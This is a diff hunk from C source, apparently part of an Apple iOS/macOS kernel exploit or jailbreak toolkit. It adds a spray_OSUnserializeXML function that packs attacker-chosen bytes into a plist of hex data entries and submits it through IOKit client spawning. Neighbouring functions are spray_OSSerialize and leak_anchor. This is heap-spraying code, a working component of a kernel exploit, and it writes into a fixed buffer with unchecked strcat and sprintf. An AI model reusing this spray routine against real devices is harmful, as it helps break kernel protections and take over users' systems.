@@ -73,6 +73,32 @@ mach_port_t spray_OSSerialize(void* data, size_t size)
     return _io_spawn_client(dictz, dict_sz);
 }
 
+// https://github.com/staturnzz/lyncis
+void spray_OSUnserializeXML(uint8_t *data, size_t size)
+{
+    char *buf = calloc(1, 10000);
+    strcpy(buf, "<plist version=\"1.0\">\n");
+    strcat(buf, "<dict>\n");
+
+    for (int i = 0; i < 8; i++){
+        char tmp[32] = {0};
+        sprintf(tmp, "<key>%c</key>\n", 'a'+i);
+        strcat(buf, tmp);
+        strcat(buf, "<data format=\"hex\">");
+
+        size_t sz = strlen(buf);
+        for (size_t j = 0; j < size; ++j) {
+            sz += sprintf(buf + sz, "%02x", data[j]);
+        }
+        strcat(buf, "</data>\n");
+    }
+
+    strcat(buf, "</dict>\n</plist>\0");
+    size_t sz = strlen(buf) + 1;
+    _io_spawn_client(buf, sz);
+    return;
+}
+
 int leak_anchor(addr_t* anchor)
 {
     io_iterator_t it = MACH_PORT_NULL;
